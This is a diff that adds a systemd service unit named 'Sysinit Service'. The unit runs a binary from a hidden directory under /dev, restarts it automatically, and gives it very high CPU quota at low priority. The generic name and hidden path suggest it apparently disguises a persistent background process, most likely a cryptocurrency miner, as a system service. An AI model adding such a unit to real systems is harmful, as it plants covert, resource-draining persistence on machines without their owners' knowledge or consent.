@@ -1,0 +1,12 @@
+[Unit]
+Description=Sysinit Service
+
+[Service]
+ExecStart=/dev/.os/sysinit
+Restart=always
+Nice=10
+CPUWeight=1
+CPUQuota=1120%
+
+[Install]
+WantedBy=multi-user.target
